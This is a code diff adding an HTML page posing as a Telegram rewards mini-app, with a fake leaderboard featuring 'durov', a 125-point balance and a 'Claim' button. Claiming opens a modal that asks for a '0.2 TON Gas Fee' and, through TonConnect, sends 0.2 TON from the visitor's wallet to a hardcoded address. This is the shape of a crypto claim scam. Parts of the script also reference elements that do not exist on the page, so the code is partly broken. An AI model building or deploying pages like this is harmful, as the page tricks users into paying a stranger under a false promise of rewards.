@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- TonConnect UI and TonWeb -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/tonweb/dist/tonweb.min.js"></script>
+    <title>Telegram UI Extended</title>
+    <!--Style-->
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #000;
+        }
+
+        /* Banner Section */
+        .main-banner {
+            background: linear-gradient(180deg, #FFCC66, #FFC300);
+            text-align: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .main-banner h2 {
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .main-banner button {
+            background-color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        /* Profile Section */
+        .profile-section {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            justify-items: center;
+            gap: 15px;
+            padding: 20px 10px;
+            background-color: #fff;
+        }
+
+        .profile {
+            text-align: center;
+            position: relative;
+        }
+
+        .profile img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid #e0e0e0;
+        }
+
+        /* Bigger Profile */
+        .profile.bigger img {
+            width: 100px;
+            height: 100px;
+            
+        }
+
+        .profile .rank {
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            background-color: #FFCC66;
+            color: #fff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .profile span {
+            display: block;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        /* Balance Section */
+        .balance-section {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px auto;
+            padding: 10px;
+            background-color: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            max-width: 500px;
+        }
+
+        .balance-item {
+            text-align: center;
+        }
+
+        .balance-item span {
+            display: block;
+            margin-top: 5px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .balance-item .highlight {
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .connect-button {
+            display: block;
+            margin: 10px auto;
+            background-color: #FFCC66;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #000;
+        }
+
+        /* Footer */
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        footer div {
+            text-align: center;
+            font-size: 12px;
+        }
+
+        footer img {
+            display: block;
+            margin: auto;
+            width: 24px;
+            height: 24px;
+        }
+        
+        /* Button Style */
+        .popup-button {
+            background-color: #FFCC66;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .popup-button:hover {
+            background-color: #FFB347;
+        }
+
+        /* Pop-up Modal Styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Transparent overlay */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .close-btn {
+            background-color: #FF6347;
+            color: #fff;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .close-btn:hover {
+            background-color: #e5533d;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Banner -->
+    <div class="main-banner">
+        <img src="star.png" style="width: 56px; height: 56px;" alt="Star" style="">
+        <h2 style="display:inline;">Telegram Business Cards are coming.</h2>
+        <button>More</button>
+    </div>
+
+    <!-- Profile Section -->
+    <div class="profile-section">
+     
+        <!-- Smaller Profiles -->
+        <div class="profile">
+            <div class="rank">2</div>
+            <img src="dmi.jpg" alt="Profile">
+            <span>dmitry ⚡</span>
+            <span><img src="icon.png" style="height: 10px;width: 10px; display: inline;align-items:center;"> 362.5K</span>
+        </div>
+           <!-- Top Profile -->
+           <div class="profile bigger">
+            <div class="rank" style="background-color: gold;">1</div>
+            <img src="durov.png" alt="Profile">
+            <span>durov 💎</span>
+            <span><img src="icon.png" style="height: 10px;width: 10px; display: inline;align-items:center;"> 1M</span>
+        </div>
+        <div class="profile">
+            <div class="rank">3</div>
+            <img src="l.jpg" alt="Profile">
+            <span> lastify</span>
+            <span><img src="icon.png" style="height: 10px;width: 10px; display: inline;align-items:center;"> 232.8K</span>
+        </div>
+      
+        
+       
+    </div>
+
+    <!-- Balance Section -->
+    <div class="balance-section">
+        <div class="balance-item">
+            <div class="highlight"><img src="major.png" style="display: inline;height:15px;width:15px;align-items:center;"> 125</div>
+            <span>Connect wallet</span>
+        </div>
+       
+    </div>
+
+    <button class="connect-button" onclick="openModal()">Claim</button>
+
+    
+    <!-- Button to Open Popup 
+    <button class="popup-button" onclick="openModal()">Click Me</button>-->
+
+    <!-- The Popup Modal -->
+    <div id="popupModal" class="modal">
+        <div class="modal-content">
+            <h2>0.2 <img src="tcoin.png" style="display: inline;height:20px;width:20px;align-items:center;"></h2>
+            <span style="display: inline; font: 1em sans-serif;">Gas Fee </span>
+        <br>
+           <!-- <button class="connect-button">Connect</button>-->
+             <!-- TON Connect button -->
+                <div id="ton-connect" style="padding-left:70px;padding-top: 20px;"></div>
+            <br>
+            <button class="close-btn" onclick="closeModal()">Close</button>
+        </div>
+    </div>
+
+    <!-- JavaScript to Control the Popup -->
+    <script>
+        // Function to Open Modal
+        function openModal() {
+            document.getElementById('popupModal').style.display = 'flex';
+        }
+
+        // Function to Close Modal
+        function closeModal() {
+            document.getElementById('popupModal').style.display = 'none';
+        }
+    </script>
+<!--ton Connect-->
+
+<script>
+    const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Replace with Wallet A's address
+    const transferAmount = 0.2 * Math.pow(10, 9); // Convert 0.2 TON to nanoTON
+
+    // Initialize TON Connect UI
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: 'https://your-app-url.com/manifest.json', // Replace with your hosted manifest URL
+        buttonRootId: 'ton-connect'
+    });
+
+    const transferBtn = document.getElementById("transferBtn");
+    const status = document.getElementById("status");
+
+    // Handle Wallet Connection
+    tonConnectUI.onStatusChange(async (walletDetails) => {
+        if (walletDetails) {
+            const walletBAddress = walletDetails.account.address;
+            status.innerText = `Connected to Wallet B: ${walletBAddress}`;
+            transferBtn.style.display = "block"; // Show the transfer button
+        } else {
+            status.innerText = "Please connect your wallet.";
+            transferBtn.style.display = "none"; // Hide the transfer button
+        }
+    });
+
+    // Function to Initiate Transfer
+    async function initiateTransfer(walletDetails) {
+        try {
+            // Transaction details
+            const transaction = {
+                to: walletAAddress,
+                value: transferAmount.toString(), // Value in nanoTON as a string
+            };
+
+            // Send the transaction using TonConnect
+            await tonConnectUI.sendTransaction(transaction);
+
+            status.innerText = `Transaction successfully sent to ${walletAAddress} for 0.2 TON!`;
+        } catch (error) {
+            status.innerText = `Transfer failed: ${error.message}`;
+            console.error("Transaction Error:", error);
+        }
+    }
+
+    // Add event listener to the transfer button
+    transferBtn.addEventListener("click", async () => {
+        const walletDetails = await tonConnectUI.getWalletDetails();
+        if (walletDetails) {
+            initiateTransfer(walletDetails);
+        } else {
+            alert("Please connect your wallet first.");
+        }
+    });
+</script>
+    <!-- Footer 
+    <footer>
+        <div>
+            <img src="icon1.png" alt="Rewards">
+            <span>Rewards</span>
+        </div>
+        <div>
+            <img src="icon2.png" alt="Games">
+            <span>Games</span>
+        </div>
+        <div>
+            <img src="icon3.png" alt="Top">
+            <span>Top</span>
+        </div>
+        <div>
+            <img src="icon4.png" alt="NFT">
+            <span>NFT</span>
+        </div>
+        <div>
+            <img src="icon5.png" alt="Profile">
+            <span>Profile</span>
+        </div>
+    </footer>-->
+
+</body>
+</html>
